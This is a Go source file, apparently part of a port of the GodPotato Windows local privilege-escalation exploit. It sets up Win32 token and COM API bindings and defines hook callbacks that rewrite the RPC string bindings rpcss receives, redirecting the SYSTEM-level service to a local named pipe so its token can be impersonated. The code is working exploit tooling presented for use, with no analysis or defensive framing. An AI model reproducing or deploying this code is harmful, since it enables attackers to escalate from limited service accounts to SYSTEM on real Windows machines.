package main

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// All Win32 calls go through LazyProc so the tool does not depend on which
// helpers the vendored x/sys version happens to expose.
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	ole32    = windows.NewLazySystemDLL("ole32.dll")
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")
	psapi    = windows.NewLazySystemDLL("psapi.dll")

	procLoadLibraryW                    = kernel32.NewProc("LoadLibraryW")
	procGetModuleHandleW                = kernel32.NewProc("GetModuleHandleW")
	procGetModuleInformation            = psapi.NewProc("GetModuleInformation")
	procVirtualProtect                  = kernel32.NewProc("VirtualProtect")
	procGetCurrentProcess               = kernel32.NewProc("GetCurrentProcess")
	procGetCurrentProcessId             = kernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThread                = kernel32.NewProc("GetCurrentThread")
	procGetCurrentThreadId              = kernel32.NewProc("GetCurrentThreadId")
	procGetNamedPipeClientProcessId     = kernel32.NewProc("GetNamedPipeClientProcessId")
	procCloseHandle                     = kernel32.NewProc("CloseHandle")
	procLocalAlloc                      = kernel32.NewProc("LocalAlloc")
	procLocalFree                       = kernel32.NewProc("LocalFree")
	procGlobalAlloc                     = kernel32.NewProc("GlobalAlloc")
	procGlobalLock                      = kernel32.NewProc("GlobalLock")
	procGlobalUnlock                    = kernel32.NewProc("GlobalUnlock")
	procGlobalSize                      = kernel32.NewProc("GlobalSize")
	procCreateNamedPipeW                = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe                = kernel32.NewProc("ConnectNamedPipe")
	procCreateFileW                     = kernel32.NewProc("CreateFileW")
	procWriteFile                       = kernel32.NewProc("WriteFile")
	procReadFile                        = kernel32.NewProc("ReadFile")
	procCreatePipe                      = kernel32.NewProc("CreatePipe")
	procSetHandleInformation            = kernel32.NewProc("SetHandleInformation")
	procCreateProcessW                  = kernel32.NewProc("CreateProcessW")
	procWaitForSingleObject             = kernel32.NewProc("WaitForSingleObject")
	procGetExitCodeProcess              = kernel32.NewProc("GetExitCodeProcess")
	procOpenProcess                     = kernel32.NewProc("OpenProcess")
	procDuplicateHandle                 = kernel32.NewProc("DuplicateHandle")
	procProcessIdToSessionId            = kernel32.NewProc("ProcessIdToSessionId")
	procGetTempPathW                    = kernel32.NewProc("GetTempPathW")
	procWideCharToMultiByte             = kernel32.NewProc("WideCharToMultiByte")
	procGetTickCount64                  = kernel32.NewProc("GetTickCount64")
	procImpersonateNamedPipeClient      = advapi32.NewProc("ImpersonateNamedPipeClient")
	procImpersonateLoggedOnUser         = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf                    = advapi32.NewProc("RevertToSelf")
	procOpenProcessToken                = advapi32.NewProc("OpenProcessToken")
	procOpenThreadToken                 = advapi32.NewProc("OpenThreadToken")
	procGetTokenInformation             = advapi32.NewProc("GetTokenInformation")
	procSetTokenInformation             = advapi32.NewProc("SetTokenInformation")
	procDuplicateTokenEx                = advapi32.NewProc("DuplicateTokenEx")
	procAdjustTokenPrivileges           = advapi32.NewProc("AdjustTokenPrivileges")
	procIsTokenRestricted               = advapi32.NewProc("IsTokenRestricted")
	procConvertSidToStringSidW          = advapi32.NewProc("ConvertSidToStringSidW")
	procConvertStringSecurityDescriptor = advapi32.NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
	procLookupAccountSidW               = advapi32.NewProc("LookupAccountSidW")
	procCreateProcessAsUserW            = advapi32.NewProc("CreateProcessAsUserW")
	procCreateProcessWithTokenW         = advapi32.NewProc("CreateProcessWithTokenW")

	procCoInitializeEx        = ole32.NewProc("CoInitializeEx")
	procCoUninitialize        = ole32.NewProc("CoUninitialize")
	procCoCreateInstance      = ole32.NewProc("CoCreateInstance")
	procCoMarshalInterface    = ole32.NewProc("CoMarshalInterface")
	procCoUnmarshalInterface  = ole32.NewProc("CoUnmarshalInterface")
	procCreateStreamOnHGlobal = ole32.NewProc("CreateStreamOnHGlobal")
	procGetHGlobalFromStream  = ole32.NewProc("GetHGlobalFromStream")
	procCreateObjrefMoniker   = ole32.NewProc("CreateObjrefMoniker")
	procCreateBindCtx         = ole32.NewProc("CreateBindCtx")
	procCoTaskMemFree         = ole32.NewProc("CoTaskMemFree")

	procNtQuerySystemInformation = ntdll.NewProc("NtQuerySystemInformation")
)

const (
	clsctxInprocServer   uint32 = 0x1
	clsctxLocalServer    uint32 = 0x4
	mshctxLocal          uint32 = 1
	mshlflagsTablestrong uint32 = 1

	coinitApartmentThreaded uint32 = 0x2

	createNoWindow           uint32 = 0x08000000
	createUnicodeEnvironment uint32 = 0x00000400
	startfUseStdHandles      uint32 = 0x00000100
	handleFlagInherit        uint32 = 0x00000001

	lmemFixed    uint32 = 0x0000
	lmemZeroInit uint32 = 0x0040
	gmemMoveable uint32 = 0x0002
	gmemZeroInit uint32 = 0x0040

	pageReadWrite = 0x04

	errorPipeConnected = 0x217
	invalidHandleValue = ^uintptr(0)

	tokenAssignPrimary    = 0x0001
	tokenDuplicate        = 0x0002
	tokenImpersonate      = 0x0004
	tokenQuery            = 0x0008
	tokenAdjustPrivileges = 0x0020
	tokenAdjustDefault    = 0x0080
	tokenAdjustSessionID  = 0x0100
	tokenAccessAll        = tokenAssignPrimary | tokenDuplicate | tokenImpersonate |
		tokenQuery | tokenAdjustPrivileges | tokenAdjustDefault | tokenAdjustSessionID

	securityImpersonation = 2
	tokenPrimaryType      = 1
	systemIntegrity       = 0x4000

	processDuplicateHandle         = 0x0040
	processQueryLimitedInformation = 0x1000

	systemExtendedHandleInformation = 64
	statusInfoLengthMismatch        = 0xC0000004
	statusBufferOverflow            = 0x80000005
)

const uintptrSize = unsafe.Sizeof(uintptr(0))

type securityAttributes struct {
	Length             uint32
	SecurityDescriptor uintptr
	InheritHandle      int32
}

type moduleInfo struct {
	BaseOfDll   uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

type luid struct {
	LowPart  uint32
	HighPart int32
}

type tokenPrivileges struct {
	PrivilegeCount uint32
	Luid           luid
	Attributes     uint32
}

func putU16(p *uintptr, v uint16) {
	*(*uint16)(unsafe.Pointer(*p)) = v
	*p += 2
}

func readPtr(addr uintptr) uintptr {
	return *(*uintptr)(unsafe.Pointer(addr))
}

func writePtr(addr, val uintptr) {
	*(*uintptr)(unsafe.Pointer(addr)) = val
}

func readU16(addr uintptr) uint16 {
	return *(*uint16)(unsafe.Pointer(addr))
}

func readU32(addr uintptr) uint32 {
	return *(*uint32)(unsafe.Pointer(addr))
}

func readI16(addr uintptr) int16 {
	return *(*int16)(unsafe.Pointer(addr))
}

func readByte(addr uintptr) byte {
	return *(*byte)(unsafe.Pointer(addr))
}

func closeHandle(handle uintptr) {
	if handle != 0 && handle != invalidHandleValue {
		procCloseHandle.Call(handle)
	}
}

func utf16Ptr(s string) *uint16 {
	p, err := windows.UTF16PtrFromString(s)
	if err != nil {
		return nil
	}
	return p
}

// orcbRPC GUID 18f70770-8e64-11cf-9af1-0020af6e72f4
var orcbRPCGUIDBytes = []byte{
	0x70, 0x07, 0xf7, 0x18,
	0x64, 0x8e,
	0xcf, 0x11,
	0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4,
}

// clientPipe is the binding string injected into the DUALSTRINGARRAY.
var clientPipe = `ncacn_np:localhost/pipe/GodPotato[\pipe\epmapper]`

// buildBindings lays out the same DUALSTRINGARRAY the C++ hook writes: two
// UTF-16 string bindings with the pipe endpoint first. Allocated with
// LocalAlloc because the pointer escapes into rpcss after the callback returns.
func buildBindings() uintptr {
	endpoints := []string{clientPipe, "ncacn_ip_tcp:fuck you !"}
	entries := 3
	for _, ep := range endpoints {
		entries += len(ep) + 1
	}
	memSize := uintptr(entries*2 + 10)

	buf, _, _ := procLocalAlloc.Call(uintptr(lmemFixed|lmemZeroInit), memSize)
	if buf == 0 {
		return 0
	}

	p := buf
	putU16(&p, uint16(entries))
	putU16(&p, uint16(entries-2))
	for _, ep := range endpoints {
		for i := 0; i < len(ep); i++ {
			putU16(&p, uint16(ep[i]))
		}
		putU16(&p, 0)
	}
	return buf
}

// rewriteBindings receives the real UseProtseq argument vector; the new
// DUALSTRINGARRAY is handed back through the second-to-last parameter.
func rewriteBindings(args []uintptr) uintptr {
	idx := len(args) - 2
	if idx < 0 {
		return 0
	}
	if buf := buildBindings(); buf != 0 {
		writePtr(args[idx], buf)
	}
	return 0
}

func hook4(a, b, c, d uintptr) uintptr { return rewriteBindings([]uintptr{a, b, c, d}) }
func hook5(a, b, c, d, e uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e})
}
func hook6(a, b, c, d, e, f uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f})
}
func hook7(a, b, c, d, e, f, g uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g})
}
func hook8(a, b, c, d, e, f, g, h uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h})
}
func hook9(a, b, c, d, e, f, g, h, i uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h, i})
}
func hook10(a, b, c, d, e, f, g, h, i, j uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h, i, j})
}
func hook11(a, b, c, d, e, f, g, h, i, j, k uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h, i, j, k})
}
func hook12(a, b, c, d, e, f, g, h, i, j, k, l uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h, i, j, k, l})
}
func hook13(a, b, c, d, e, f, g, h, i, j, k, l, m uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h, i, j, k, l, m})
}
func hook14(a, b, c, d, e, f, g, h, i, j, k, l, m, n uintptr) uintptr {
	return rewriteBindings([]uintptr{a, b, c, d, e, f, g, h, i, j, k, l, m, n})
}

func callbackFor(paramCount uint32) uintptr {
	callbacks := map[uint32]interface{}{
		4:  hook4,
		5:  hook5,
		6:  hook6,
		7:  hook7,
		8:  hook8,
		9:  hook9,
		10: hook10,
		11: hook11,
		12: hook12,
		13: hook13,
		14: hook14,
	}
	fn, ok := callbacks[paramCount]
	if !ok {
		return 0
	}
	return windows.NewCallback(fn)
}

// vtableCall invokes method `index` of a COM interface (this in rcx).
func vtableCall(this uintptr, index int, args ...uintptr) uintptr {
	vtbl := readPtr(this)
	fn := readPtr(vtbl + uintptr(index)*unsafe.Sizeof(uintptr(0)))
	callArgs := make([]uintptr, 0, len(args)+1)
	callArgs = append(callArgs, this)
	callArgs = append(callArgs, args...)
	r, _, _ := syscall.SyscallN(fn, callArgs...)
	return r
}

func comRelease(this uintptr) {
	if this != 0 {
		vtableCall(this, 2)
	}
}
